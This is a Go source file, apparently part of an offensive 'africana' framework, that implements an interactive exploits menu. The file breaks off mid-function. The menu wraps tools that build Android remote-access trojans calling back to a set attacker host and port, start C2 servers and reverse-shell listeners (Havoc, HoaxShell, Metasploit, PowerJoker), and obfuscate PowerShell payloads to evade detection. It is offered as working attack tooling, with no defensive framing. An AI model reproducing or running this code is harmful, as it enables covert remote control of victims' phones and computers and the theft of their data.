package exploits

import (
    "os"
    "fmt"
    "log"
    "utils"
    "bufio"
    "menus"
    "banners"
    "strings"
    "scriptures"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "path/filepath"
    "encoding/base64"
)

var (
    Protocol = "tcp"
    Icon = "vlc"
    Lport = "9999"
    Hport = "3333"
    C2 = "blackjack"
    Malware  = "africana_malware"
    Lhost = LhostIp
    scanner = bufio.NewScanner(os.Stdin)
    LhostIp, _ = utils.GetDefaultIP()
    Input, Rhost, Proxy, Function, Script string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "proxies": "",
    "function": "",
    "script": "",
    "icon": "vlc",
    "lport": "9999",
    "hport": "3333",
    "c2": "blackjack",
    "protocol": "tcp",
    "build": "africana_malware",
    "lhost": LhostIp,
    "output": OutPutDir,
}

func ExploitsPentest() {
    for {
        fmt.Printf("%s%safr3%s exploits(%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Red, Function, bcolors.Endc, bcolors.Green, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandMap := map[string]func(){

    "? info":               menus.HelpInfo,
    "h info":               menus.HelpInfo,
    "help info":            menus.HelpInfo,

    "v":                    banners.Version,
    "version":              banners.Version,

    "s":                    utils.Sleep,
    "sleep":                utils.Sleep,

    "o":                    utils.ListJunks,
    "junks":                utils.ListJunks,
    "outputs":              utils.ListJunks,
    "clear junks":          utils.ClearJunks,
    "clear outputs":        utils.ClearJunks,

    "logs":                 subprocess.LogHistory,
    "history":              subprocess.LogHistory,
    "clear logs":           subprocess.ClearHistory,
    "clear history":        subprocess.ClearHistory,

    "? run":                menus.HelpInfoRun,
    "h run":                menus.HelpInfoRun,
    "info run":             menus.HelpInfoRun,
    "help run":             menus.HelpInfoRun,

    "use":              menus.HelpInfoUse,
    "? use":            menus.HelpInfoUse,
    "h use":            menus.HelpInfoUse,
    "info use":         menus.HelpInfoUse,
    "help use":         menus.HelpInfoUse,

    "? exec":               menus.HelpInfoRun,
    "h exec":               menus.HelpInfoRun,
    "info exec":            menus.HelpInfoRun,
    "help exec":            menus.HelpInfoRun,
    "? start":              menus.HelpInfoRun,
    "h start":              menus.HelpInfoRun,
    "info start":           menus.HelpInfoRun,
    "help start":           menus.HelpInfoRun,
    "? launch":             menus.HelpInfoRun,
    "h launch":             menus.HelpInfoRun,
    "info launch":          menus.HelpInfoRun,
    "help launch":          menus.HelpInfoRun,
    "? exploit":            menus.HelpInfoRun,
    "h exploit":            menus.HelpInfoRun,
    "info exploit":         menus.HelpInfoRun,
    "help exploit":         menus.HelpInfoRun,
    "? execute":            menus.HelpInfoRun,
    "h execute":            menus.HelpInfoRun,
    "info execute":         menus.HelpInfoRun,
    "help execute":         menus.HelpInfoRun,

    "set":                  menus.HelpInfoSet,
    "h set":                menus.HelpInfoSet,
    "info set":             menus.HelpInfoSet,
    "help set":             menus.HelpInfoSet,

    "tips":                 menus.HelpInfoTips,
    "h tips":               menus.HelpInfoTips,
    "? tips":               menus.HelpInfoTips,
    "info tips":            menus.HelpInfoTips,
    "help tips":            menus.HelpInfoTips,

    "show":                 menus.HelpInfoShow,
    "? show":               menus.HelpInfoShow,
    "h show":               menus.HelpInfoShow,
    "info show":            menus.HelpInfoShow,
    "help show":            menus.HelpInfoShow,

    "info list":            menus.HelpInfoList,
    "help list":            menus.HelpInfoList,
    "use list":             menus.HelpInfoList,
    "list":                 menus.HelpInfoList,

    "? options":            menus.HelpInfOptions,
    "info options":         menus.HelpInfOptions,
    "help options":         menus.HelpInfOptions,

    "banner":               banners.RandomBanners,
    "g":                    utils.BrowseTutarilas,
    "t":                    utils.BrowseTutarilas,
    "guide":                utils.BrowseTutarilas,
    "tutarial":             utils.BrowseTutarilas,
    "h":                    menus.HelpInfoMenuZero,
    "?":                    menus.HelpInfoMenuZero,
    "00":                   menus.HelpInfoMenuZero,
    "help":                 menus.HelpInfoMenuZero,
    "f":                    menus.HelpInfoFeatures,
    "use f":                menus.HelpInfoFeatures,
    "features":             menus.HelpInfoFeatures,
    "use features":         menus.HelpInfoFeatures,

    //Chameleons//
    "info":                 menus.HelpInfoExploits, 

    "m":                    menus.MenuFour,
    "menu":                 menus.MenuFour,

    "option":               menus.ExploitsOptions,
    "options":              menus.ExploitsOptions,
    "show option":          menus.ExploitsOptions,
    "show options":         menus.ExploitsOptions,

    "show all":         menus.ListExploitsFunctions,
    "list all":         menus.ListExploitsFunctions,

    "func":             menus.ListExploitsFunctions,
    "funcs":            menus.ListExploitsFunctions,
    "functions":        menus.ListExploitsFunctions,
    "show func":        menus.ListExploitsFunctions,
    "list funcs":       menus.ListExploitsFunctions,
    "show funcs":       menus.ListExploitsFunctions,
    "show function":    menus.ListExploitsFunctions,
    "list function":    menus.ListExploitsFunctions,
    "list functions":   menus.ListExploitsFunctions,
    "show functions":   menus.ListExploitsFunctions,

    "module":           menus.ListExploitsFunctions,
    "modules":          menus.ListExploitsFunctions,
    "list module":      menus.ListExploitsFunctions,
    "show module":      menus.ListExploitsFunctions,
    "list modules":     menus.ListExploitsFunctions,
    "show modules":     menus.ListExploitsFunctions,

    "1":                    func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "run 1":                func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "use 1":                func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "exec 1":               func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "start 1":              func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "launch 1":             func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "exploit 1":            func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "execute 1":            func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "run ghost":            func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "use ghost":            func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "exec ghost":           func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "start ghost":          func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "launch ghost":         func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "exploit ghost":        func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},
    "execute ghost":        func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir); menus.MenuFour()},

    "? 1":                  menus.HelpInfoGhost,
    "info 1":               menus.HelpInfoGhost,
    "help 1":               menus.HelpInfoGhost,
    "ghost":                menus.HelpInfoGhost,
    "info ghost":           menus.HelpInfoGhost,
    "help ghost":           menus.HelpInfoGhost,

    "2":                    func() {Shellz(); menus.MenuFour()},
    "run 2":                func() {Shellz(); menus.MenuFour()},
    "use 2":                func() {Shellz(); menus.MenuFour()},
    "exec 2":               func() {Shellz(); menus.MenuFour()},
    "start 2":              func() {Shellz(); menus.MenuFour()},
    "launch 2":             func() {Shellz(); menus.MenuFour()},
    "exploit 2":            func() {Shellz(); menus.MenuFour()},
    "execute 2":            func() {Shellz(); menus.MenuFour()},
    "run shellz":           func() {Shellz(); menus.MenuFour()},
    "use shellz":           func() {Shellz(); menus.MenuFour()},
    "exec shellz":          func() {Shellz(); menus.MenuFour()},
    "start shellz":         func() {Shellz(); menus.MenuFour()},
    "launch shellz":        func() {Shellz(); menus.MenuFour()},
    "exploit shellz":       func() {Shellz(); menus.MenuFour()},
    "execute shellz":       func() {Shellz(); menus.MenuFour()},

    "? 2":                  menus.HelpInfoShellz,
    "info 2":               menus.HelpInfoShellz,
    "help 2":               menus.HelpInfoShellz,
    "shellz":               menus.HelpInfoShellz,
    "info shellz":          menus.HelpInfoShellz,
    "help shellz":          menus.HelpInfoShellz,

    "3":                    func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "run 3":                func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "use 3":                func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "exec 3":               func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "start 3":              func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "launch 3":             func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "exploit 3":            func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "execute 3":            func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "run listener":         func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "use listener":         func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "exec listener":        func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "start listener":       func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "launch listener":      func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "exploit listener":     func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},
    "execute listener":     func() {ListenerLauncher(C2, Lport, Hport, Protocol); menus.MenuFour()},

    "? 3":                  menus.HelpInfoListener,
    "info 3":               menus.HelpInfoListener,
    "help 3":               menus.HelpInfoListener,
    "listener":             menus.HelpInfoListener,
    "info listener":        menus.HelpInfoListener,
    "help listener":        menus.HelpInfoListener,

    "4":                    func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "run 4":                func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "use 4":                func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exec 4":               func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "start 4":              func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "launch 4":             func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exploit 4":            func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "execute 4":            func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "run androrat":         func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "use androrat":         func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exec androrat":        func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "start androrat":       func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "launch androrat":      func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exploit androrat":     func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "execute androrat":     func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour()},

    "? 4":                  menus.HelpInfoAndroRat,
    "info 4":               menus.HelpInfoAndroRat,
    "help 4":               menus.HelpInfoAndroRat,
    "androrat":             menus.HelpInfoAndroRat,
    "info androrat":        menus.HelpInfoAndroRat,
    "help androrat":        menus.HelpInfoAndroRat,

    "5":                    func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "run 5":                func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "use 5":                func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exec 5":               func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "start 5":              func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "launch 5":             func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exploit 5":            func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "execute 5":            func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "run teardroid":        func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "use teardroid":        func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exec teardroid":       func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "start teardroid":      func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "launch teardroid":     func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "exploit teardroid":    func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},
    "execute teardroid":    func() {TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour()},

    "? 5":                  menus.HelpInfoTearDroid,
    "info 5":               menus.HelpInfoTearDroid,
    "help 5":               menus.HelpInfoTearDroid,
    "teardroid":            menus.HelpInfoTearDroid,
    "info teardroid":       menus.HelpInfoTearDroid,
    "help teardroid":       menus.HelpInfoTearDroid,

    "6":                    func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "run 6":                func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "use 6":                func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exec 6":               func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "start 6":              func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "launch 6":             func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exploit 6":            func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "execute 6":            func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "run blackjack":        func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "use blackjack":        func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exec blackjack":       func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "start blackjack":      func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "launch blackjack":     func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exploit blackjack":    func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "execute blackjack":    func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},

    "? 6":                  menus.HelpInfoBlackJack,
    "info 6":               menus.HelpInfoBlackJack,
    "help 6":               menus.HelpInfoBlackJack,
    "blackjack":            menus.HelpInfoBlackJack,
    "info blackjack":       menus.HelpInfoBlackJack,
    "help blackjack":       menus.HelpInfoBlackJack,

    "7":                    func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "run 7":                func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "use 7":                func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exec 7":               func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "start 7":              func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "launch 7":             func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exploit 7":            func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "execute 7":            func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "run hoaxshell":        func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "use hoaxshell":        func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exec hoaxshell":       func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "start hoaxshell":      func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "launch hoaxshell":     func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "exploit hoaxshell":    func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},
    "execute hoaxshell":    func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour()},

    "? 7":                  menus.HelpInfoHoaxShell,
    "info 7":               menus.HelpInfoHoaxShell,
    "help 7":               menus.HelpInfoHoaxShell,
    "phishers":             menus.HelpInfoHoaxShell,
    "info phishers":        menus.HelpInfoHoaxShell,
    "help phishers":        menus.HelpInfoHoaxShell,

    "8":                    func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "run 8":                func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "use 8":                func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "exec 8":               func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "start 8":              func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "launch 8":             func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "exploit 8":            func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "execute 8":            func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "run noisemaker":       func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "use noisemaker":       func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "exec noisemaker":      func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "start noisemaker":     func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "launch noisemaker":    func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "exploit noisemaker":   func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},
    "execute noisemaker":   func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour()},

    "? 8":                  menus.HelpInfoNoiseMaker,
    "info 8":               menus.HelpInfoNoiseMaker,
    "help 8":               menus.HelpInfoNoiseMaker,
    "noisemaker":           menus.HelpInfoNoiseMaker,
    "info noisemaker":      menus.HelpInfoNoiseMaker,
    "help noisemaker":      menus.HelpInfoNoiseMaker,

    "9":                    func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "run 9":                func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "use 9":                func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "exec 9":               func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "start 9":              func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "launch 9":             func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "exploit 9":            func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "execute 9":            func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "run codebreaker":      func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "use codebreaker":      func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "exec codebreaker":     func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "start codebreaker":    func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "launch codebreaker":   func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "exploit codebreaker":  func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},
    "execute codebreaker":  func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour()},

    "? 9":                  menus.HelpInfoCodeBreaker,
    "info 9":               menus.HelpInfoCodeBreaker,
    "help 9":               menus.HelpInfoCodeBreaker,
    "credits":              menus.HelpInfoCodeBreaker,
    "info credits":         menus.HelpInfoCodeBreaker,
    "help credits":         menus.HelpInfoCodeBreaker,

    "99":                   scriptures.ScriptureNarators,
    "run 99":               scriptures.ScriptureNarators,
    "use 99":               scriptures.ScriptureNarators,
    "exec 99":              scriptures.ScriptureNarators,
    "start 99":             scriptures.ScriptureNarators,
    "launch 99":            scriptures.ScriptureNarators,
    "exploit 99":           scriptures.ScriptureNarators,
    "execute 99":           scriptures.ScriptureNarators,
    "run verses":           scriptures.ScriptureNarators,
    "use verses":           scriptures.ScriptureNarators,
    "exec verses":          scriptures.ScriptureNarators,
    "start verses":         scriptures.ScriptureNarators,
    "launch verses":        scriptures.ScriptureNarators,
    "exploit verses":       scriptures.ScriptureNarators,
    "execute verses":       scriptures.ScriptureNarators,

    "? 99":                 menus.HelpInfoVerses,
    "verses":               menus.HelpInfoVerses,
    "info 99":              menus.HelpInfoVerses,
    "help 99":              menus.HelpInfoVerses,
    "info verses":          menus.HelpInfoVerses,
    "help verses":          menus.HelpInfoVerses,
    }
    if action, exists := commandMap[strings.ToLower(cmd)]; exists {
        action()
        return true
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "c2": &C2,
        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
        "protocol": &Protocol,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "c2": &C2,
        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
        "protocol": &Protocol,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func MalwarePenFunctions(Function string, args ...interface{}) {
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    commands := map[string]func(){
        "ncat":         func() {Ncat(Lport, Protocol)},
        "havoc":        func() {Havoc()},
        "ghost":        func() {Gh0x0st(Malware, ToolsDir, Script, OutPutDir)},
        "shellz":       func() {Shellz()},
        "seashell":     func() {SeaShell()},
        "androrat":     func() {AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir)},
        "listener":     func() {ListenerLauncher(C2, Lport, Hport, Protocol)},
        "teardroid":    func() {TearDroid(Malware, ToolsDir, OutPutDir)},
        "blackjack":    func() {BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir)},
        "hoaxshell":    func() {HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir)},
        "meterpeter":   func() {MeterPeter()},
        "powerjoker":   func() {PowerJoker(Lhost, Lport, ToolsDir)},
        "metasploit":   func() {Metasploit(Lhost, Lport, Protocol)},
        "noisemaker":   func() {NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2)},
        "codebreaker":  func() {CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2)},
    }

    if action, exists := commands[Function]; exists {
        action()
    } else {
        fmt.Printf("\n%s[!] %sFunction %s is invalid. Use %s'help' %sfor available Functions.\n", bcolors.Yellow, bcolors.Endc, Function, bcolors.Green, bcolors.Endc)
    }
}

func executeFunction() {
    if Function == "" {
        fmt.Printf("\n%s[!] %sFunction not set. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
        return
    }
    MalwarePenFunctions(Function, Lhost, Lport, Hport, Protocol, C2, Malware)
}


func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Popen(`cd %s/exploits/windows/c2/shells/; bash shells.sh`, ToolsDir)
}

func SeaShell() {
    subprocess.Popen(`cd %s/exploits/mackos/c2/seashell/; python3 sea_shell.py`, ToolsDir)
}

func MeterPeter() {
    subprocess.Popen(`cd %s/exploits/windows/c2/meterpeter/; pwsh meterpeter.ps1`, ToolsDir)
}

func TearDroid(Malware string, ToolsDir string, OutPutDir string) {
    fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", Malware, OutPutDir)
    subprocess.Popen(`cd %s/exploits/androids/c2/teardroid/; python3 Teardroid.py -b %s`, ToolsDir, Malware)
}

func AndroRat(Lhost string, Lport string, Malware string, ToolsDir string, OutPutDir string) {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install %s/exploits/androids/c2/androrat/zipalign_8.1.0.deb --allow-downgrades -y`, ToolsDir)
    }
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", Lhost, Lport, Malware, OutPutDir)
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --build -i %s -p %s -o %s/%s.apk", ToolsDir, Lhost, Lport, OutPutDir, Malware))
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --shell -i %s -p %s", ToolsDir, Lhost, Lport))
}

func Chameleon(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s/%s`, ToolsDir, Script, OutPutDir, Malware)

}

func Gh0x0st(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.Red, bcolors.Endc, bcolors.Green, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, Script, OutPutDir)
}

func PowerJoker(Lhost string, Lport string, ToolsDir string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\n\n", Lhost, Lport)
    subprocess.Popen(`cd %s/exploits/windows/c2/joker/; python3 joker.py -l %s -p %s`, ToolsDir, Lhost, Lport)
}


func HoaxShell(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/hoaxshell/; python3 hoaxshell.py -s %s -p %s", ToolsDir, Lhost, Lport)
    case "https", "http":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
